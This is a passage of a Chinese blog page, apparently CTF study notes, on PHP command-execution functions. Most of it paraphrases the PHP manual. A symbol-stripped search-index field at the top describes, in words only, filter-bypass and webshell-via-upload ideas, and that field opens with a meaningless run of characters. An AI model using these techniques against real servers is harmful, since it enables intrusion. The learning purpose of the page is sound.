蒂韩棱椰焚椎棺榔椭粟棘酣酥硝硫颊雳翘凿棠晰鼎喳遏晾畴跋跛蛔蜒蛤鹃喻啼喧嵌赋赎赐锉锌甥掰氮氯黍筏牍粤逾腌腋腕猩猬惫敦痘痢痪竣翔奠遂焙滞湘渤渺溃溅湃愕惶寓窖窘雇谤犀隘媒媚婿缅缆缔缕骚瑟鹉瑰搪聘斟靴靶蓖蒿蒲蓉楔椿楷榄楞楣酪碘硼碉辐辑频睹睦瞄嗜嗦暇畸跷跺蜈蜗蜕蛹嗅嗡嗤署蜀幌锚锥锨锭锰稚颓筷魁衙腻腮腺鹏肄猿颖煞雏馍馏禀痹廓痴靖誊漓溢溯溶滓溺寞窥窟寝褂裸谬媳嫉缚缤剿赘熬赫蔫摹蔓蔗蔼熙蔚兢榛榕酵碟碴碱碳辕辖雌墅嘁踊蝉嘀幔镀舔熏箍箕箫舆僧孵瘩瘟彰粹漱漩漾慷寡寥谭褐褪隧嫡缨撵撩撮撬擒墩撰鞍蕊蕴樊樟橄敷豌醇磕磅碾憋嘶嘲嘹蝠蝎蝌蝗蝙嘿幢镊镐稽篓膘鲤鲫褒瘪瘤瘫凛澎潭潦澳潘澈澜澄憔懊憎翩褥谴鹤憨履嬉豫缭撼擂擅蕾薛薇擎翰噩橱橙瓢蟥霍霎辙冀踱蹂蟆螃螟噪鹦黔穆篡篷篙篱儒膳鲸瘾瘸糙燎濒憾懈窿缰壕藐檬檐檩檀礁磷了瞬瞳瞪曙蹋蟋蟀嚎赡镣魏簇儡徽爵朦臊鳄糜癌懦豁臀藕藤瞻嚣鳍癞瀑襟璧戳攒孽蘑藻鳖蹭蹬簸簿蟹靡癣羹鬓攘蠕巍鳞糯譬霹躏髓蘸镶瓤矗通过在内方法提交具体命令字符串编码字符串极区区皮十勺编码字符串码寸小欠立编码不需要再进行编码提交服务器端口号无字母数字自增绕过无字母数字特殊符号过滤无字母数字下划线短标签方式提交取反取反无字母数字下划线及符号过滤式执行利用函数文化读取中上传文件会把我们上传的文件暂时存在目录下默认文件名是文件名最后个字符是随机的大小写字母通配符可以匹配到能匹配东西太多通常会报错表示在和之间的字符也就是大写字母保障最后一位为大写字母一先构造一个文件上传的数据包二页面生成临时文件存储在目录下三执行指令读取文件执行其中指令四在上传的文件中写入一句话木马把木马生成位置知道一个绝对路径直接执行在内监控文件修改数据包数据包不知道是什么可以通过下面这个网页传链接是当前打开的题目链接文件名提交保存为文件用浏览器打开随便提交一个文件用进行抓包然后再去修改文件内容就行了提交这里发现已经写入成功了下面可以用连接无字母数字过滤无字母数字只获得数字例题百万美元的诱惑在里输入可以构造出对其进行取反就可以构造出原理是对二进制取反取反将两个合在一起取反即这里可以用取反为也可以是取反为和取反为再合并还可以表示当前运行进程的进程号并且注意到没有被拦截里面可以包裹并计算数学表达式则做个简单除法即为即为则有了编码',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-08-10 09:58:40',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><link rel="stylesheet" href="/css/imgloaded.css?1"><link rel="stylesheet" href="/custom/css/schedule.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/poem/poem.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/mainColor/heoMainColor.css"><meta name="generator" content="Hexo 7.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250723094953412.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">永远自由如风 永远为自己着迷</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/SSRF/" style="font-size: 1.05rem;">SSRF<sup>1</sup></a><a href="/tags/XXE/" style="font-size: 1.05rem;">XXE<sup>1</sup></a><a href="/tags/ctfshow/" style="font-size: 1.05rem;">ctfshow<sup>3</sup></a><a href="/tags/jwt/" style="font-size: 1.05rem;">jwt<sup>1</sup></a><a href="/tags/phptop10/" style="font-size: 1.05rem;">phptop10<sup>1</sup></a><a href="/tags/wp/" style="font-size: 1.05rem;">wp<sup>18</sup></a><a href="/tags/xss/" style="font-size: 1.05rem;">xss<sup>2</sup></a><a href="/tags/%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80/" style="font-size: 1.05rem;">橙子科技<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/11/"><span class="card-archive-list-date">十一月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/08/"><span class="card-archive-list-date">八月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">6</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/07/"><span class="card-archive-list-date">七月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">6</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/05/"><span class="card-archive-list-date">五月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/04/"><span class="card-archive-list-date">四月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/03/"><span class="card-archive-list-date">三月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item on" id="consoleCommentBarrage" onclick="anzhiyu.switchCommentBarrage()" title="热评开关"><a class="commentBarrage"><i class="anzhiyufont anzhiyu-icon-message"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/phptop10/" itemprop="url">phptop10</a><i class="anzhiyufont anzhiyu-icon-angle-right post-meta-separator"></i><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/phptop10/%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80/" itemprop="url">橙子科技</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/phptop10/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>phptop10</span></a><a class="article-meta__tags" href="/tags/%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>橙子科技</span></a></span></div></div><h1 class="post-title" itemprop="name headline">php命令执行</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2025-08-09T08:52:41.376Z" title="发表于 2025-08-09 16:52:41">2025-08-09</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2025-08-10T01:58:40.420Z" title="更新于 2025-08-10 09:58:40">2025-08-10</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">14.7k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>60分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="php命令执行"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为衡阳"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>衡阳</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250809165008358.gif"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://dada-06.github.io/posts/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.html"><header><a class="post-meta-categories" href="/categories/phptop10/" itemprop="url">phptop10</a><a class="post-meta-categories" href="/categories/phptop10/%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80/" itemprop="url">橙子科技</a><a href="/tags/phptop10/" tabindex="-1" itemprop="url">phptop10</a><a href="/tags/%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80/" tabindex="-1" itemprop="url">橙子科技</a><h1 id="CrawlerTitle" itemprop="name headline">php命令执行</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">达达</span><time itemprop="dateCreated datePublished" datetime="2025-08-09T08:52:41.376Z" title="发表于 2025-08-09 16:52:41">2025-08-09</time><time itemprop="dateCreated datePublished" datetime="2025-08-10T01:58:40.420Z" title="更新于 2025-08-10 09:58:40">2025-08-10</time></header><h2 id="0x01命令执行函数介绍"><a href="#0x01命令执行函数介绍" class="headerlink" title="0x01命令执行函数介绍"></a>0x01命令执行函数介绍</h2><p>常见函数</p>
<p>system   exec   passthru   shell_exec   反引号   popen   proc_open   pcntl_exec</p>
<h3 id="system-有回显"><a href="#system-有回显" class="headerlink" title="system  有回显"></a>system  有回显</h3><p>system(string $command,int &amp;$return_var &#x3D; ?)</p>
<p>常用参数：</p>
<p>command：执行command参数所指定的目录，并且输出执行结果</p>
<p>如果提供rerurn_var参数，则外部命令执行后的返回状态将会被设置到此变量中</p>
<h3 id="exec-回显最后一行"><a href="#exec-回显最后一行" class="headerlink" title="exec  回显最后一行"></a>exec  回显最后一行</h3><p>exec（<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.string.php">字符串</a> <code>$command</code>， <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.array.php">数组</a> <code>&amp;$output</code> &#x3D; <strong><code>null</code></strong>， <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.integer.php">int</a> <code>&amp;$result_code</code> &#x3D; <strong><code>null</code></strong>）：</p>
<p><strong>exec（）</strong> 执行给定的 .<code>command</code></p>
<p>参数</p>
<ul>
<li><p><code>command</code></p>
<p>将要执行的命令。</p>
</li>
<li><p><code>output</code></p>
<p>如果存在该参数，则 指定的数组将填充 命令。尾随空格（如 ， ）不是 包含在此数组中。请注意，如果数组已经包含一些 元素中，<strong>exec（）</strong> 将附加到数组的末尾。 如果你不希望函数附加元素，请在将数组传递给 <strong>exec（）</strong> 之前对数组调用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.unset.php">unset（）。</a><code>output``\n</code></p>
</li>
<li><p><code>result_code</code></p>
<p>如果存在参数 以及参数，则 返回已执行命令的状态将写入此 变量。<code>result_code``output</code></p>
</li>
</ul>
<h3 id="passthru-有回显"><a href="#passthru-有回显" class="headerlink" title="passthru   有回显"></a>passthru   有回显</h3><p>passthru（<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.string.php">字符串</a> <code>$command</code>， <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.integer.php">int</a> <code>&amp;$result_code</code> &#x3D; <strong><code>null</code></strong>）： <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.null.php">？</a><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.singleton.php">假</a></p>
<p><strong>passthru（）</strong> 函数与 <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.exec.php">exec（）</a> 函数类似，因为它都执行一个 .此功能 当 Unix 命令的输出时，应该使用 exec<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.exec.php">（）</a> 或 <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.system.php">system（）</a> 是二进制数据，需要直接传递回 浏览器。此作的常见用途是执行类似于 PBMPlus实用程序。由 将 Content-type 设置为 和 然后调用 PBMPluss 程序输出一个 gif，可以创建 直接输出图像的 PHP 脚本。<code>command``image/gif</code></p>
<p>参数</p>
<p><code>command</code></p>
<ul>
<li><p>将要执行的命令。</p>
</li>
<li><p><code>result_code</code></p>
<p>如果存在该参数，则 返回状态将放在 Unix 命令的此处。<code>result_code</code></p>
</li>
</ul>
<h3 id="shell-exec-无回显"><a href="#shell-exec-无回显" class="headerlink" title="shell_exec  无回显"></a>shell_exec  无回显</h3><p>shell_exec（<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.string.php">字符串</a> <code>$command</code>）：<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.string.php">字符串</a>|<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.singleton.php">错误</a>|<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.null.php">零</a></p>
<p>参数</p>
<ul>
<li><p><code>command</code></p>
<p>将要执行的命令。</p>
</li>
</ul>
<p>返回值</p>
<p>一个<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.string.php">包含</a>已执行命令输出的字符串，**<code>如果</code>**管道 cannot established 或 <strong><code>null</code></strong>（如果发生错误或命令未生成任何输出）。</p>
<blockquote>
<p><strong>注意</strong>：</p>
<p>此函数可以在发生错误时返回 <strong><code>null</code></strong>，也可以返回程序 不产生任何输出。无法使用 这个函数。<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.exec.php">exec（）</a> 在访问 程序退出代码是必需的。</p>
</blockquote>
<p>使用echo  print等输出结果</p>
<h3 id="popen-无回显"><a href="#popen-无回显" class="headerlink" title="popen  无回显"></a>popen  无回显</h3><p>popen（<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.string.php">字符串</a> <code>$command</code>， <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.string.php">字符串</a> <code>$mode</code>）：<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.resource.php">资源</a>|<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.singleton.php">假</a></p>
<p>参数</p>
<h3 id="command"><a href="#command" class="headerlink" title="command"></a><code>command</code></h3><ul>
<li><p>命令</p>
</li>
<li><p><code>mode</code></p>
<p>模式。要么用于阅读，要么用于写作。<code>&#39;r&#39;``&#39;w&#39;</code>在 Windows 上，<strong>popen（）</strong> 默认为文本模式，即写入管道或从管道读取的任何字符都将被转换为 . 如果不需要，可以通过分别设置为 和 来强制执行二进制模式。<code>\n``\r\n``mode``&#39;rb&#39;``&#39;wb&#39;</code></p>
</li>
</ul>
<p>返回值</p>
<p>返回与 <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.fopen.php">fopen（）</a> 返回的文件指针相同的文件指针，不同之处在于它是单向的（可能是 仅用于读取或写入），并且必须用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.pclose.php">pclose（）</a> 关闭。此指针可以与 <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.fgets.php">fgets（）、</a><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.fgetss.php">fgetss（）</a> 和 <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.fwrite.php">fwrite（）</a> 一起使用。当模式为 ‘r’ 时，返回的 file 指针等于命令的 STDOUT，当模式 是 ‘w’，则返回的文件指针等于 命令。</p>
<p>如果发生错误，则返回 <strong><code>false</code></strong>。</p>
<p>fgets获取内容  -&gt;  print_r输出内容</p>
<h3 id="proc-open-无回显"><a href="#proc-open-无回显" class="headerlink" title="proc_open  无回显"></a>proc_open  无回显</h3><p>proc_open（<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.array.php">数组</a>|<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.string.php">字符串</a> <code>$command</code>、<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.array.php">数组</a> <code>$descriptor_spec</code>、<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.array.php">数组</a> <code>&amp;$pipes</code>、<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.null.php">？</a><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.string.php">字符串</a> <code>$cwd</code> &#x3D; <strong><code>空</code></strong>，<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.null.php">？</a><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.array.php">数组</a> <code>$env_vars</code> &#x3D; <strong><code>空</code></strong><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.null.php">？</a><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.array.php">数组</a> <code>$options</code> &#x3D; <strong><code>null</code></strong>）：<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.resource.php">resource</a>|<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.singleton.php">假</a></p>
<p><strong>proc_open（）</strong> 类似于 <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.popen.php">popen（），</a>但对程序执行的控制程度要大得多。</p>
<p>参数</p>
<ul>
<li><p><code>command</code></p>
<p>要作为<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.string.php">字符串</a>执行的命令行。特殊字符必须正确转义， 并且必须应用适当的引用。</p>
</li>
<li><p><code>descriptor_spec</code></p>
<p>一个索引数组，其中 key 表示描述符编号， value 表示 PHP 如何将该描述符传递给 child 过程。0 是 stdin，1 是 stdout，而 2 是 stderr。每个元素可以是：描述要传递给进程的管道的数组。第一个 元素是描述符类型，第二个元素是 给定的类型。有效类型包括 （第二个 元素是将 pipe 的读取端 传递给进程，或传递写入端）和（第二个元素是文件名）。 请注意，其他任何内容都被视为 .<code>pipe``r``w``file``w``r</code>表示真实文件描述符的流资源（例如，打开的文件、 套接字 **<code>STDIN）。</code>**文件描述符编号不限于 0、1 和 2 - 您可以 指定任何有效的文件描述符编号，它将被传递给 子进程。这允许您的脚本与其他 作为 “co-process” 运行的脚本。特别是，这对于 将密码短语传递给 PGP、GPG 和 openssl 等程序 安全的方式。它对于读取状态信息也很有用 由这些程序在辅助文件描述符上提供。</p>
</li>
<li><p><code>pipes</code></p>
<p>将设置为对应于 PHP 创建的任何管道的末尾。</p>
</li>
<li><p><code>cwd</code></p>
<p>命令的初始工作目录。这必须是<strong>绝对</strong>目录路径**&#96;&#96;，如果您想使用**默认值（当前 PHP 进程）</p>
</li>
<li><p><code>env_vars</code></p>
<p>一个数组，其中包含命令的环境变量，该命令将是 run 或 <strong><code>null</code></strong> 使用与当前 PHP 进程相同的环境</p>
</li>
<li><p><code>options</code></p>
<p>允许您指定其他选项。当前支持的选项 包括：<code>suppress_errors</code>（仅限 Windows）：禁止显示错误 由此函数在设置为 <strong><code>true</code></strong> 时生成<code>bypass_shell</code>（仅限 Windows）：设置为 <strong><code>true</code></strong> 时绕过 shell<code>cmd.exe``blocking_pipes</code>（仅限 Windows）：强制 设置为 <strong><code>true</code></strong> 时阻塞管道<code>create_process_group</code>（仅限 Windows）：允许 设置为 <strong><code>true</code></strong> 时处理事件的子进程<code>CTRL``create_new_console</code>（仅限 Windows）：新流程 具有新的控制台，而不是继承其父级的控制台</p>
</li>
</ul>
<p>返回值</p>
<p>返回表示进程的资源，完成后应使用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.proc-close.php">proc_close（）</a> 释放该资源。失败时 返回 <strong><code>false</code></strong>。</p>
<p>pcntl_exec（<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.string.php">字符串</a> <code>$path</code>， <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.array.php">数组</a> <code>$args</code> &#x3D; []， <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.array.php">数组</a> <code>$env_vars</code> &#x3D; []）： <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.boolean.php">布尔值</a></p>
<p>使用给定的参数执行程序。</p>
<p>参数</p>
<ul>
<li><p><code>path</code></p>
<p><code>path</code>必须是二进制可执行文件的路径，或者是 脚本，其有效路径指向 shebang （ #！&#x2F;usr&#x2F;local&#x2F;bin&#x2F;perl）作为第一行。查看系统的 man execve（2） 页面了解更多信息。</p>
</li>
<li><p><code>args</code></p>
<p><code>args</code>是传递给 程序。</p>
</li>
<li><p><code>env_vars</code></p>
